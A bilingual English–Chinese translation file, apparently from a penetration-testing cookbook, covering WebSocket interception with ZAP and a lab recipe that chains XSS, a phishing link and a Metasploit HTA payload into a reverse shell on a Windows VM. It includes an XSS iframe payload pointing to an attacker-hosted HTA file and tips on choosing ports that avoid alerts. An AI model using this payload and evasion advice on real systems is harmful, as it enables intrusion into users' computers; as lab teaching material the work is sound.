- en: 'Now, in the browser go to `http://dvws.local/DVWS/` and select Stored XSS from
    the menu:'
  id: totrans-204
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，在浏览器中访问 `http://dvws.local/DVWS/` 并从菜单中选择 Stored XSS：
- en: '![](assets/af5eae68-c4fc-4b09-affd-82b9580fda40.png)'
  id: totrans-205
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/af5eae68-c4fc-4b09-affd-82b9580fda40.png)'
- en: 'Enter some comments and change to ZAP. In the History tab, look for for a request
    to `http://dvws.local:8080/post-comments`; this is the handshake to start the
    WebSockets session:'
  id: totrans-206
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 输入一些评论并切换到 ZAP。在 History 标签页中，查找对 `http://dvws.local:8080/post-comments` 的请求；这是启动
    WebSockets 会话的握手请求：
- en: '![](assets/6e0527f0-3659-4d08-850b-e9d35ef14c86.png)'
  id: totrans-207
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/6e0527f0-3659-4d08-850b-e9d35ef14c86.png)'
- en: 'A request to initiate WebSockets communication includes the Sec-WebSocket-Key
    header followed by a base64 encoded value. This key is not an authentication mechanism;
    it only helps ensure that the server does not accept connections from non-WebSockets
    clients:'
  id: totrans-208
  prefs: []
  type: TYPE_NORMAL
  zh: 启动 WebSockets 通信的请求包含 Sec-WebSocket-Key 头，并跟随一个 base64 编码的值。这个密钥不是一种身份验证机制，它仅用于确保服务器不会接受非
    WebSockets 客户端的连接：
- en: '![](assets/4868c623-3d7e-4b27-a692-c77c28ec0be3.png)'
  id: totrans-209
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/4868c623-3d7e-4b27-a692-c77c28ec0be3.png)'
- en: The server's response is a 101 Switching Protocols code that includes a header,
    `Sec-WebSocket-Accept`, with a key similar in purpose to the one used by the client.
  id: totrans-210
  prefs: []
  type: TYPE_NORMAL
  zh: 服务器的响应是一个 101 Switching Protocols 代码，其中包含一个 `Sec-WebSocket-Accept` 头，其功能类似于客户端使用的密钥。
- en: 'In ZAP''s WebSockets tab, you can see that there are multiple communication
    channels, that is, multiple connections established and all messages have a direction
    (ingoing or outgoing), an opcode, and a payload, which is the information to be
    communicated:'
  id: totrans-211
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在 ZAP 的 WebSockets 标签中，你可以看到多个通信通道，也就是多个已建立的连接，所有消息都有方向（输入或输出）、一个 opcode 和一个
    payload，即要传递的信息：
- en: '![](assets/f6759ea3-aafb-4086-85d3-c435d1e01dbe.png)'
  id: totrans-212
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/f6759ea3-aafb-4086-85d3-c435d1e01dbe.png)'
- en: 'To intercept WebSocket, add a breakpoint by clicking the break icon in the
    WebSockets tab. Select the Opcode, Channel, and Payload Pattern that needs to
    be matched to an intercept:'
  id: totrans-213
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 要拦截 WebSocket，通过点击 WebSockets 标签中的断点图标来添加一个断点。选择需要匹配以进行拦截的 Opcode、Channel 和
    Payload Pattern：
- en: '![](assets/b52a5037-c70d-454b-9d9f-926687b47d4e.png)'
  id: totrans-214
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/b52a5037-c70d-454b-9d9f-926687b47d4e.png)'
- en: 'When a breakpoint is hit, the message will be shown in the upper panel, like
    every other break in ZAP, but here we can alter the contents and send or discard
    the message:'
  id: totrans-215
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 当断点被触发时，消息会显示在上方面板，就像 ZAP 中的其他断点一样，但在这里我们可以更改内容并重新发送或丢弃消息：
- en: '![](assets/b58eb621-f699-4905-b2e9-fe3cc46646b8.png)'
  id: totrans-216
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/b58eb621-f699-4905-b2e9-fe3cc46646b8.png)'
- en: 'ZAP also has the ability to replay/resend an existing message; right-click
    on any row in the WebSockets tab and select Open/Resend with Message Editor:'
  id: totrans-217
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: ZAP 还具有重播/重新发送现有消息的功能；右键点击 WebSockets 标签中的任何一行，选择“打开/重新发送与消息编辑器”选项：
- en: '![](assets/96fe4476-14a1-4a06-8c3b-23be40840c06.png)'
  id: totrans-218
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/96fe4476-14a1-4a06-8c3b-23be40840c06.png)'
- en: 'Then, we will see the WebSocket Message Editor window, where we can change
    all of the parameters of the message, including its direction and contents, and
    send it again:'
  id: totrans-219
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 然后，我们将看到 WebSocket 消息编辑器窗口，在这里我们可以更改消息的所有参数，包括其方向和内容，然后再次发送：
- en: '![](assets/5360236f-73e8-460b-80d6-3fb0aa925e06.png)Most of the attacks and
    security weaknesses inherent in web applications can be replicated and exploited
    via WebSockets if the application is vulnerable.'
  id: totrans-220
  prefs: []
  type: TYPE_NORMAL
  zh: '![](assets/5360236f-73e8-460b-80d6-3fb0aa925e06.png) 大多数 Web 应用程序固有的攻击和安全弱点，如果应用程序存在漏洞，可以通过
    WebSockets 进行复制和利用。'
- en: How it works...
  id: totrans-221
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 它是如何工作的...
- en: WebSockets communication is initiated by the client via the `WebSocket` class
    in JavaScript. When a WebSocket instance is created, the client starts the handshake
    with the server. When the server responds to the handshake and the connection
    is established, the HTTP connection is then replaced by the WebSocket connection,
    and it becomes a bidirectional binary protocol not necessarily compatible with
    HTTP.
  id: totrans-222
  prefs: []
  type: TYPE_NORMAL
  zh: WebSockets 通信是通过 JavaScript 中的 `WebSocket` 类由客户端发起的。当 WebSocket 实例被创建时，客户端开始与服务器的握手。当服务器响应握手并且连接建立后，HTTP
    连接就会被 WebSocket 连接取代，并成为一个双向二进制协议，这个协议并不一定与 HTTP 兼容。
- en: 'WebSockets is plain text, as is HTTP. The server will still require you to
    implement HTTPS to provide an encrypted layer. If we sniff the communication in
    the previous exercise with Wireshark, we can easily read the message:'
  id: totrans-223
  prefs: []
  type: TYPE_NORMAL
  zh: WebSockets 是纯文本格式，与 HTTP 相似。服务器仍然要求你实现 HTTPS 来提供加密层。如果我们使用 Wireshark 对前面练习中的通信进行嗅探，我们可以轻松读取消息：
- en: '![](assets/1114f8a7-adc4-423d-944d-2290e587ca14.png)'
  id: totrans-224
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/1114f8a7-adc4-423d-944d-2290e587ca14.png)'
- en: Notice how the messages sent by the client are masked (not encrypted) and the
    ones from the server are in clear text; this is part of the protocol definition
    for RFC 6455 ([http://www.rfc-base.org/txt/rfc-6455.txt](http://www.rfc-base.org/txt/rfc-6455.txt)).
  id: totrans-225
  prefs: []
  type: TYPE_NORMAL
  zh: 注意，客户端发送的消息是被掩盖的（未加密的），而服务器发送的消息是明文的；这是 RFC 6455 协议定义的一部分（[http://www.rfc-base.org/txt/rfc-6455.txt](http://www.rfc-base.org/txt/rfc-6455.txt)）。
- en: Using XSS and Metasploit to get a remote shell
  id: totrans-226
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 使用 XSS 和 Metasploit 获取远程 Shell
- en: In previous chapters, we have seen that XSS can be used by an attacker to extract
    user information or perform actions on the user's behalf within the application's
    scope. However, with a little more effort and some well-executed social engineering
    labor, an attacker can use XSS to convince the user to download and execute malicious
    software that can be used to compromise their client computer and gain further
    access to the local network.
  id: totrans-227
  prefs: []
  type: TYPE_NORMAL
  zh: 在前面的章节中，我们已经看到，XSS 可被攻击者用来提取用户信息或在应用程序范围内代表用户执行操作。然而，通过稍微多一点的努力和一些巧妙的社会工程，攻击者可以利用
    XSS 说服用户下载并执行恶意软件，从而危害其客户端计算机，并进一步访问本地网络。
- en: In this recipe, we will see a proof of concept for a more elaborated XSS attack
    that will conclude with the attacker being able to remotely execute commands on
    the victim's computer.
  id: totrans-228
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个示例中，我们将看到更复杂的 XSS 攻击的概念验证，最终导致攻击者能够在受害者计算机上远程执行命令。
- en: Getting ready
  id: totrans-229
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 准备工作
- en: For this recipe, we will use BodgeIt from the vulnerable VM `vm_1` as the exploited
    application. We will also need a separate client virtual machine, for the sake
    of clarity. In this recipe, we will add a Windows 7 virtual machine to our laboratory.
  id: totrans-230
  prefs: []
  type: TYPE_NORMAL
  zh: 对于这个示例，我们将使用易受攻击的 VM `vm_1` 上的 BodgeIt 作为受攻击的应用程序。为了清晰起见，我们还需要一个单独的客户端虚拟机。在这个示例中，我们将在我们的实验室中添加一个
    Windows 7 虚拟机。
- en: If you don't have a Windows VM already configured, Microsoft has various setups
    available for developers to test their applications in its Internet Explorer and
    Edge browsers; you can download them from [https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/](https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/).
    For this recipe, we will use Windows 7 with IE 8\. Feel free to try it in any
    other version; it should work with some minor changes in architecture and OS settings.
  id: totrans-231
  prefs: []
  type: TYPE_NORMAL
  zh: 如果您尚未配置 Windows 虚拟机，Microsoft 提供了多种设置供开发人员测试其应用程序在其 Internet Explorer 和 Edge
    浏览器中使用；您可以从 [https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/](https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/)
    下载它们。对于这个示例，我们将使用带有 IE 8 的 Windows 7。随意尝试其他版本；只需在架构和操作系统设置中进行一些微小更改，应该也可以工作。
- en: How to do it...
  id: totrans-232
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 如何做到...
- en: 'What we are going to do is to use XSS to make the browser open and execute
    a malicious HTA file hosted in our Kali VM:'
  id: totrans-233
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将利用 XSS 让浏览器打开并执行我们在 Kali 虚拟机中托管的恶意 HTA 文件：
- en: 'First, let''s set up the server. Open the Metasploit console:'
  id: totrans-234
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 首先，让我们设置服务器。打开 Metasploit 控制台：
- en: '[PRE10]'
  id: totrans-235
  prefs: []
  type: TYPE_PRE
  zh: '[PRE10]'
- en: 'Once it''s started, execute the following commands to load the exploit module
    and payload:'
  id: totrans-236
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 一旦启动，执行以下命令加载攻击模块和载荷：
- en: '[PRE11]'
  id: totrans-237
  prefs: []
  type: TYPE_PRE
  zh: '[PRE11]'
- en: 'Now, our server will listen on port `8888`:'
  id: totrans-238
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，我们的服务器将监听端口 `8888`：
- en: '[PRE12]'
  id: totrans-239
  prefs: []
  type: TYPE_PRE
  zh: '[PRE12]'
- en: 'And the listener for the reverse connection, once the payload is executed,
    will be on port `12345`:'
  id: totrans-240
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 一旦执行了载荷，反向连接的监听器将在端口 `12345` 上：
- en: '[PRE13]'
  id: totrans-241
  prefs: []
  type: TYPE_PRE
  zh: '[PRE13]'
- en: '![](assets/14d5ed1b-11be-4b98-bc7b-c1f9c5b490d8.png)'
  id: totrans-242
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/14d5ed1b-11be-4b98-bc7b-c1f9c5b490d8.png)'
- en: 'Now, we run the exploit and wait for a client to connect:'
  id: totrans-243
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，运行攻击并等待客户端连接：
- en: '[PRE14]'
  id: totrans-244
  prefs: []
  type: TYPE_PRE
  zh: '[PRE14]'
- en: '![](assets/361113ad-f065-4230-9b9f-d15c607dc342.png)'
  id: totrans-245
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/361113ad-f065-4230-9b9f-d15c607dc342.png)'
- en: Notice the information given by the server when it starts. The Local IP value
    tells us how to access the malicious HTA file, whose name is a random string with
    the extension `.hta` (`k0Pjsl1tz2cI3Mm.hta` in this case).
  id: totrans-246
  prefs: []
  type: TYPE_NORMAL
  zh: 服务器启动时请注意提供的信息。本地 IP 值告诉我们如何访问恶意的 HTA 文件，其文件名是随机字符串并附带扩展名 `.hta`（本例中为 `k0Pjsl1tz2cI3Mm.hta`）。
- en: Now, go to the Windows VM, our client, and open Internet Explorer.
  id: totrans-247
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，前往我们的客户端 Windows 虚拟机，并打开 Internet Explorer。
- en: Suppose the attacker sends a phishing email containing a link to `http://192.168.56.11/bodgeit/search.jsp?q=t<iframe
    src="http://192.168.56.10:8888/k0Pjsl1tz2cI3Mm.hta"></iframe>` to the victim.
    Open that link in Internet Explorer.
  id: totrans-248
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 假设攻击者发送了一封包含链接到 `http://192.168.56.11/bodgeit/search.jsp?q=t<iframe src="http://192.168.56.10:8888/k0Pjsl1tz2cI3Mm.hta"></iframe>`
    的钓鱼邮件给受害者。在 Internet Explorer 中打开该链接。
- en: 'If the pretext in the email and the XSS attack are good, the user will accept
    the warnings and will download and execute the file. Accept the download of the
    file in IE:'
  id: totrans-249
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 如果电子邮件中的假设和 XSS 攻击成功，用户将接受警告并下载并执行文件。在 IE 中接受文件的下载：
- en: '![](assets/209f1b00-be17-484c-9ff8-4e9fbcd87750.png)'
  id: totrans-250
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/209f1b00-be17-484c-9ff8-4e9fbcd87750.png)'
- en: 'When prompted to Run, Save, or Cancel, run the HTA file:'
  id: totrans-251
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 当提示运行、保存或取消时，请运行 HTA 文件：
- en: 'Now, let''s go back to the attacking side. Go to Kali and check the terminal
    that has the exploit running; it should have received the requests and sent the
    payload:'
  id: totrans-252
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，让我们回到攻击方面。转到 Kali 并检查正在运行攻击的终端；它应该已经收到请求并发送了载荷：
- en: '![](assets/9a7e5b68-f119-4bc1-86af-301b89a8aa2e.png)'
  id: totrans-253
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/9a7e5b68-f119-4bc1-86af-301b89a8aa2e.png)'
- en: Notice how Metasploit says it has a new session opened, in our case with the
    number `2`. Use the `sessions` command to see the details.
  id: totrans-254
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 注意，Metasploit 表示已经打开了一个新的会话，在我们的情况下编号为 `2`。使用 `sessions` 命令查看详细信息。
- en: 'To interact with session number `2`, use `sessions -i 2`. You will be in a
    Windows Command Prompt; issue some Windows commands to verify that it is actually
    the victim machine:'
  id: totrans-255
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 要与会话号 `2` 交互，使用 `sessions -i 2`。您将进入一个 Windows 命令提示符；输入一些 Windows 命令来验证它确实是受害者机器：
- en: '![](assets/9137ce1d-a36d-4927-9085-f38b2c59c57e.png)'
  id: totrans-256
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/9137ce1d-a36d-4927-9085-f38b2c59c57e.png)'
- en: How it works...
  id: totrans-257
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 工作原理...
- en: '**HTA** stands for **HTML Application**, which is a format that allows for
    the execution of code within a web browser but without the constraints of the
    browser security model; it is like running a fully trusted application, like the
    browser itself or MS Word.'
  id: totrans-258
  prefs: []
  type: TYPE_NORMAL
  zh: '**HTA** 代表 **HTML 应用程序**，这是一种允许在 Web 浏览器内执行代码的格式，但没有浏览器安全模型的约束；它就像运行一个完全受信任的应用程序，类似于浏览器本身或
    MS Word。'
- en: In this recipe, we used Metasploit to generate a malicious HTA file and set
    up a server to host it. Our malicious file contained a reverse shell; a reverse
    shell is a program that, when executed by the victim, will establish a connection
    back to the attacker's server (that's why it is called **reverse**), as opposed
    to opening a port in the victim to wait for an incoming connection. When this
    connection is completed, a command execution session (a remote shell) is established.
  id: totrans-259
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个示例中，我们使用了 Metasploit 来生成恶意 HTA 文件并设置服务器来托管它。我们的恶意文件包含了一个反向 Shell；反向 Shell
    是一种程序，当受害者执行它时，会建立与攻击者服务器的连接（这就是它被称为**反向**的原因），与在受害者端打开端口等待传入连接不同。当连接建立后，会创建一个命令执行会话（远程
    Shell）。
- en: We arbitrarily picked port `8888` for our server and port `12345` for the exploit
    listener. In a real-world scenario, maybe port `80` or `443` with proper TLS configuration
    would be more convenient, as those are the common ports for HTTP communication
    and the shell exploit would require a more advanced setup, including encrypted
    communication and maybe the use of another port that doesn't raise alerts when
    communication is detected by an administrator. SSH port `22` is a good choice.
  id: totrans-260
  prefs: []
  type: TYPE_NORMAL
  zh: 我们随便选择了端口`8888`作为我们的服务器端口，`12345`作为漏洞监听器的端口。在实际场景中，也许使用端口`80`或`443`并配置适当的 TLS
    会更加方便，因为这些是 HTTP 通信的常用端口，且 shell 漏洞利用需要更为复杂的设置，包括加密通信，可能还需要使用其他端口，这样在管理员检测到通信时不会引发警报。SSH
    端口`22`是一个不错的选择。
- en: In this attack, XSS is only the method used to load the malicious file into
    the victim machine; it also assumes that the attacker will create a convincing
    social engineering scenario so that the file is accepted and executed.
  id: totrans-261
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个攻击中，XSS 只是用来将恶意文件加载到受害者机器上的方法；它还假设攻击者会创建一个具有说服力的社会工程学场景，以便文件被接受并执行。
